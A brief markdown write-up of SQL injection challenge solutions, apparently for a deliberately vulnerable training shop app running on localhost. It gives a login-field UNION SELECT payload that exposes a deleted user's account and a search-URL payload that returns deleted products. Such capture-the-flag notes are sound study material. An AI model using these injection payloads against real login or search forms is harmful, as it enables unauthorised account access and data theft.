# Injections

## Chris' account

At login:

```
' UNION SELECT * from Users WHERE deletedAt IS NOT NULL --
```

## DB Schema (no spoil)

It solved another challenge at the same time: "user's credentials"

## Get all products, included the deleted ones

```
http://localhost:3000/rest/products/search?q='))--
```